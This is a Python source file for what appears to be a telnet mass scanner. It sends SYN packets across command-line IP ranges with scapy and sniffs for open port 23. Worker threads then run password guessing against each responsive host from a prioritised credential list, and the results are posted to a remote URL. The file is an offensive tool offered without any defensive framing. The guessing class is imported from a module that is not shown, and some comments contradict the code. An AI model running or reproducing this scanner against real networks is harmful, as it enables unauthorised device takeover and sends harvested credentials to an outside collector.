#!/usr/bin/python
#encoding:utf-8


import heapq
import copy
import time 
import datetime
import threading
from random import choice
import Queue
#import socket
import json
import requests
import sys
import new_module
from new_module import *
from scapy.all import *
from collections import deque

try:
    import xml.etree.cElementTree as ET
except ImportError:
    import xml.etree.ElementTree as ET

reload(sys)
sys.setdefaultencoding('utf-8')

class PriorityQueue:
    def __init__(self):
        self._queue = []
        self._index = 0

    def push(self,pair,priority):
        heapq.heappush(self._queue,(-priority,self._index,pair))
        self._index += 1

    def pop(self):
        return heapq.heappop(self._queue)[-1]

auth_table = []
auth_queue = PriorityQueue()

lastRecv = time.time()
exitFlag = 0
queue = Queue.Queue()
queueLocker = threading.Lock()
ipLocker = threading.Lock()
ip_prompt_queue = deque(maxlen = 100)
post_url = ""

def ip2num(ip,bigendian = True):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3] & 0xffffffff

def num2ip(num,bigendian = True):
    return '%s.%s.%s.%s' % ((num >> 24) & 0xff , (num >> 16) & 0xff , (num >> 8) & 0xff , num & 0xff)

def read_ip():
    ip_map = []
    ip_pair = []
    ipstr = sys.argv[2].split(',')
    for line in ipstr:
        line=line.split('-')
        ip_pair.append(line)

    for x in ip_pair:
        ip_map.append(range(ip2num(x[0]),ip2num(x[1]) + 1))

 #   print (ip_pair)
 #   print (ip_map)
 #   sys.exit(1)
    return ip_map

def read_auth():
    fp=open("./auth_config.txt","r")
    for line in fp.readlines():
        line=line.replace('\n','')
        line=line.split(',')
        auth_table.append(line)
#    print (auth_table)
    fp.close()
    for item in auth_table:
#        print (item[0:2])
        auth_queue.push(item[0:2],int(item[-1]))


def choose_ip(ip_pair):
    if len(ip_pair) > 0:
        return choice(ip_pair)
    else:
        return None

def controlP():
    '''Init threads'''
    scanner_list = []
    start_time = datetime.datetime.now()
    spewer_thread = spewer()
    try:
       spewer_thread.start()
    except:
       print ("[Error] Start spewer faild!")
       sys.exit()
             
    sniffer_thread = sniffer()
    try:
        sniffer_thread.daemon = True
        sniffer_thread.start()
    except:
       print ("[Error] Start sniffer faild!")
       sys.exit()

    for i in range(int(sys.argv[1])):
        t = Scanner()
        try:
            t.start()
        except:
            pass
        scanner_list.append(t)

    while True:
        global exitFlag
        global lastRecv
        time.sleep(1)
        if time.time() - lastRecv > 30 and exitFlag == 1:
            exitFlag = 2
        elif exitFlag == 3:
            my_http_post()
            end_time = datetime.datetime.now()
            print ("scanner mission completes...")
            print ("It totally costs: %d seconds..." % (end_time - start_time).seconds)
            break
    
    sys.exit(1)
            
def cook(pkt):
    try:
        global lastRecv
        lastRecv = time.time()
        print ("pkt[TCP].flags: %s,%s " % (pkt[TCP].flags,pkt[IP].src))
        if pkt[TCP].flags == 18 and pkt[IP].src not in ip_prompt_queue:
            queue.put(pkt[IP].src)
            print ("23 port opened: %s " % (pkt[IP].src))
            #print pkt[IP].dst
            ip_prompt_queue.append(pkt[IP].src)
    except:
        pass

class sniffer(threading.Thread):
    '''receive sport=22 package'''
    def __init_(self):
        threading.Thread.__init__(self)

    def run(self):
        print ("Start to sniffing...")
        sniff(filter="tcp and dst port 2222 and src port 23",prn=cook)


class spewer(threading.Thread):
    '''send dport=22 package'''
    def __init__(self):
        threading.Thread.__init__(self)
        self.ip_pair = read_ip()
        read_auth()
        global post_url
        post_url = sys.argv[3]


    def run(self):
        global exitFlag
        print ("Start to spewing...")
        pkt = IP()/TCP(sport=2222,dport=[23],flags="S")
        for pair in self.ip_pair:
            for ip in pair:
                pkt[IP].dst = num2ip(ip)
                #print ("pkt[IP].dst=%s" % pkt[IP].dst)
                try:
                    send(pkt,verbose=0)
                except:
                    pass
        exitFlag = 1

class Scanner(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        #print ("Starting scanner threading...")
        while True:
            ip_port = None
            queueLocker.acquire()
            global exitFlag
            if self.queue.empty() and exitFlag == 2 or exitFlag == 3:
                queueLocker.release()
                exitFlag = 3
                break
            elif self.queue.empty():
                queueLocker.release()
                time.sleep(3)
                continue
            try:
                ip_port = self.queue.get(block=False)
                #print "one IP gets\n"
            except:
                pass
            queueLocker.release()
            if ip_port: 
                #print "[scanner] Try to auth %s" % ip
                pass
            else:
                time.sleep(3)
                continue

            #password guessing
            con = Connection(copy.deepcopy(ip_port),copy.deepcopy(auth_queue))
            while con._state:
                con.run()
            con.exit()
            del con

def my_http_post():
    s = json.dumps(post_json_list, ensure_ascii=False)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(post_url, data=s, headers=headers)
    print (r.text)

                                        
if __name__ == "__main__": 
    if len(sys.argv) != 4:
        print ("usage: scanner.py thread_number and ipstr and post_url")
        print ("example: scanner.py 20 192.168.42.3-192.168.42.5,192.168.43.1-192.168.43.5 http://httpbin.org/post")
        sys.exit(1)
    controlP()
